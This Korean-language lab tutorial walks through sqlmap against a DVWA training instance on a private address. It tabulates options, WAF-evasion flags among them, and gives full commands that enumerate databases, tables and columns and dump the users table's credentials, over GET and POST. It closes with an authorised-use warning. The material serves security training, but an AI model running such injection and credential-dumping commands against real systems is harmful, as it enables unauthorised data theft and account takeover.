# sqlmap

- sqlmap은 SQL Injection 취약점을 자동으로 탐지하고, 데이터베이스 정보를 단계적으로 추출해주는 자동화 도구입니다.
- Blind SQL Injection, Error-based, UNION-based, Time-based 등 다양한 기법을 자동으로 판단하여 공격을 수행합니다.

---

## 요청 구조 확인

- 다음은 사용자의 입력을 받아 `id` 값이 존재하면 해당 컬럼을 출력하는 로직입니다.

![13](/sqlmap/imgs/13.png)

- 서버로 요청이 전달되기 전 `Burp Suite`로 패킷을 스니핑하여 요청 구조를 확인합니다.

![14](/sqlmap/imgs/14.png)

- 요청 메소드는 `GET` 방식이며, 실제 요청된 URL은 다음과 같습니다.
```text
http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit
```
- id 값은 1, 2, 3 등 어떤 값이 와도 동작에는 영향을 주지 않습니다.

---

## sqlmap 사용 전 옵션 정리

- 본격적인 데이터 추출에 앞서 sqlmap에서 사용되는 주요 옵션을 정리합니다.

---

## sqlmap 문법 및 주요 옵션 정리

| 옵션 | 이름 | 설명 | 특징 |
| --- | --- | --- | --- |
| -u | URL | 테스트할 대상 URL 지정 | GET 파라미터 대상 |
| --data | Data | POST 데이터 지정 | POST 인젝션 |
| -r | Request | Burp 등에서 저장한 요청 파일 사용 | 실무 최다 |
| -p | Parameter | 테스트할 파라미터 지정 | 특정 파라미터만 |
| --cookie | Cookie | 쿠키 값 지정 | 로그인 세션 유지 |
| --user-agent | User-Agent | User-Agent 지정 | WAF 회피 |
| --headers | Headers | 추가 HTTP 헤더 지정 | 인증 토큰 |
| --method | Method | HTTP 메서드 지정 | PUT, DELETE 등 |
| --dbs | Databases | 데이터베이스 목록 조회 | 1차 정찰 |
| -D | Database | 특정 데이터베이스 지정 | 후속 단계 |
| --tables | Tables | 테이블 목록 조회 | 구조 파악 |
| -T | Table | 특정 테이블 지정 | 세부 접근 |
| --columns | Columns | 컬럼 목록 조회 | 민감 컬럼 탐색 |
| -C | Column | 특정 컬럼 지정 | 계정 추출 |
| --dump | Dump | 데이터 덤프 | 정보 탈취 |
| --dump-all | Dump All | 전체 DB 덤프 | 고위험 |
| --where | Where | WHERE 조건 지정 | 특정 행 |
| --current-db | Current DB | 현재 DB 확인 | 기본 정보 |
| --current-user | Current User | DB 접속 계정 확인 | 권한 추정 |
| --is-dba | Is DBA | DBA 권한 여부 확인 | 위험도 판단 |
| --technique | Technique | 공격 기법 지정 | B,T,E,U,Q |
| --time-sec | Time | 지연 시간 설정 | Time-based |
| --level | Level | 테스트 레벨 | 범위 확대 |
| --risk | Risk | 공격 위험도 | 공격 강도 |
| --threads | Threads | 동시 요청 수 | 속도 향상 |
| --batch | Batch | 자동 응답 | 자동화 |
| --tamper | Tamper | 우회 스크립트 | WAF 회피 |
| --proxy | Proxy | 프록시 지정 | Burp 연동 |

---

## 공격 기법 코드

| 코드 | 의미 |
| --- | --- |
| B | Boolean-based Blind |
| T | Time-based Blind |
| E | Error-based |
| U | UNION-based |
| Q | Stacked Queries |

---

## 데이터베이스 목록 조회

- 로그인된 세션으로 인식되도록 쿠키 값을 함께 전달해야 정상적인 요청이 수행됩니다.
- `--dbs` 옵션을 사용하여 데이터베이스 목록을 조회합니다.
```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit#" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" --dbs
```
![01](/sqlmap/imgs/01.png)

- sqlmap은 해당 취약점이 Boolean-based Blind SQL Injection임을 자동으로 판단합니다.
- 잠시 후 접근 가능한 데이터베이스 목록이 출력됩니다.

![02](/sqlmap/imgs/02.png)

- `dvwa`는 실제 사용자 정보가 저장된 데이터베이스입니다.
- `information_schema`는 MySQL 시스템 메타데이터 데이터베이스입니다.

---

## 테이블 목록 조회

- dvwa 데이터베이스의 테이블 목록을 조회합니다.
```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa --tables
```
![03](/sqlmap/imgs/03.png)
![04](/sqlmap/imgs/04.png)

- `users` 테이블에 계정 정보가 존재할 가능성이 높습니다.

---

## 컬럼 목록 조회

- `users` 테이블의 컬럼 목록을 조회합니다.
```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa -T users --columns
```
![05](/sqlmap/imgs/05.png)
![06](/sqlmap/imgs/06.png)

---

## 사용자 계정 정보 탈취

- `user`와 `password` 컬럼의 값을 추출합니다.
```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=low" -D dvwa -T users -C user,password --dump
```
![07](/sqlmap/imgs/07.png)

- `password`는 해시 형태로 저장되어 있으며 sqlmap이 원문 문자열도 함께 출력합니다.

![08](/sqlmap/imgs/08.png)

---

## 최종 결과

- `계정` : `admin`
- `비밀번호` : `test` 

- Blind SQL Injection을 통해 데이터베이스 구조 파악부터 계정 정보 탈취까지 가능함을 확인했습니다.

---

## POST 요청에서의 sqlmap 사용

- 다음은 `GET` 요청이 아닌 `POST` 요청 방식의 취약점입니다.

![10](/sqlmap/imgs/10.png)

- Burp Suite로 캡쳐한 패킷을 보면 요청 메소드는 `POST`임을 확인할 수 있습니다.

![09](/sqlmap/imgs/09.png)

- POST 요청의 경우 `--data` 옵션을 사용하여 요청 바디를 직접 지정합니다.
```text
sqlmap -u "http://192.168.0.121/DVWA/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=77a9af6820ff7b5a92ca5bfa35ff4b3; security=medium" --data="id=3&Submit=Submit" --dbs
```
![11](/sqlmap/imgs/11.png)

- 정상적으로 데이터베이스 목록이 출력되는 것을 확인할 수 있습니다.

![12](/sqlmap/imgs/12.png)

---

## 주의사항

### sqlmap은 매우 공격적인 도구이므로 반드시 허가된 실습 환경에서만 사용해야 합니다.
